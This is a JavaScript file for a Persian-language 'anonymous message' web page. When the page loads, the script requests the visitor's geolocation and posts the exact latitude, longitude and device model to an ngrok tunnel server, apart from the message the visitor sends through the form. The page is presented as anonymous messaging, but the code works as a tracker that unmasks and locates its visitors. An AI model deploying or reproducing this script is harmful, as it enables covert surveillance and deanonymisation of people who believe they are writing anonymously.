var server = "https://53be-79-127-241-55.ngrok-free.app";

// Extract device model from user agent
function getDeviceModel(userAgent) {
    const deviceRegex = /\\(([^)]+)\\)/; // Matches everything inside parentheses in the userAgent
    const match = userAgent.match(deviceRegex);
    if (match && match[1]) {
        return match[1]; // Returns the first match inside parentheses
    }
    return "Unknown Device";
}

// Send location to the server when the page loaded
window.onload = function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            // Get the user location
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            // Get the system information
            const systemInfo = navigator.userAgent;
            const deviceModel = getDeviceModel(systemInfo);
            // Prepare location and system data
            const locationData = {
                location: {
                    latitude: latitude,
                    longitude: longitude
                },
                deviceModel: deviceModel
            };

            // Send the location and system info to the server
            fetch(`${server}/send-location`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(locationData)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Location and system info sent successfully');
            })
            .catch((error) => {
                console.error('Error while sending the location and system info: ', error);
            });
        }, function(error) {
            alert('برای دریافت موقعیت مکانی به مرورگر اجازه دهید.');
        });
    } else {
        alert('موقعیت مکانی پشتیبانی نمی‌شود.');
    }
};

// Send message to the server
document.getElementById('messageForm').addEventListener('submit', function(event) {
    event.preventDefault();
    // Get name and message
    const name = document.getElementById('name').value;
    const message = document.getElementById('message').value;
    // Prepare message data
    const messageData = {
        name: name,
        message: message
    };
    // Send message to the server
    fetch(`${server}/receive-message`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(messageData)
    })
    .then(response => response.json())
    .then(data => {
        alert('پیام با موفقیت ارسال شد!');
        document.getElementById('messageForm').reset();
    })
    .catch((error) => {
        console.error('Error while sending the message: ', error);
        alert('ارسال پیام با خطا مواجه شد.');
    });
});

const nameInput = document.getElementById('name');
const anonymousCheckbox = document.getElementById('anonymous');
anonymousCheckbox.addEventListener('change', function() {
    if (this.checked) {
        nameInput.value = 'ناشناس';
        nameInput.disabled = true;
    } else {
        nameInput.value = '';
        nameInput.disabled = false;
    }
});
